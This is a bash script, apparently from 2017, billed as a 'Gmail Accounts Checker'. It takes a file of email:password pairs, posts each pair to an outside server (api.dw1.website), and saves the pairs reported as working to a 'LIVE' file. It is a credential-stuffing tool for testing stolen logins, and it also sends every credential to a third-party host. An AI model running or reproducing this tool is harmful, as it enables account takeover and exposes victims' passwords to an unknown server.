#!/bin/bash
cat <<EOF

  # Gmail Accounts Checker
  # @ 2017, dw1

EOF
val=0;live=0;died=0;prob=0;unkn=0;CY='\e[36m';GR='\e[2;32m';OG='\e[92m';WH='\e[37m';RD='\e[31m';YL='\e[33m';BF='\e[34m';DF='\e[39m';OR='\e[33m';PP='\e[35m';B='\e[1m';CC='\e[0m';gmailCheck(){ if [[ ${email} =~ "@gmail.com" ]];then local cek=$(curl -X POST -s -L "https://api.dw1.website/gmail/check?format=text" --data "email=${1}&password=${2}");val=$[$val+1];fi;local acc=${1}${3}${2};if [[ $cek == "1" ]];then printf "${GR}[$(date '+%H:%M:%S')] [LIVE] ${acc}${CC}\n";echo "${acc}">>"LIVE-$(date '+%Y%m%d').txt";live=$[$live+1];elif [[ $cek == "0" ]];then printf "[$(date '+%H:%M:%S')] ${RD}[DIED]${CC} ${acc}\n";died=$[$died+1];elif [[ $cek == "2" ]];then printf "[$(date '+%H:%M:%S')] ${YL}[PROB]${CC} ${acc}\n";prob=$[$prob+1];else printf "[$(date '+%H:%M:%S')] ${PP}[UNKN]${CC} ${acc}\n";echo "${acc}">unknown.txt;unkn=$[$unkn+1];fi;};if [[ -z $2 ]];then printf "Usage: bash $0 <mailist.txt> <delim>\n";exit 1;fi;IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))';no=1;for((i = 0;i<${#mailist[@]};i++));do user="${mailist[$i]}";IFS="$2" read -r -a array<<<"$user";email=${array[0]};password=${array[1]};gmailCheck "${email}" "${password}" "$2";no=$[$i+1];done;printf "\nTotal ${#mailist[@]} email ${B}(${val} valid gmail)${CC}\n${GR}${live} live${CC}, ${RD}${died} died${CC}, ${YL}${prob} problem${CC} & ${PP}${unkn} unknown${CC} email.\n";wait

# Live account saved to "./LIVE-<date now>.txt"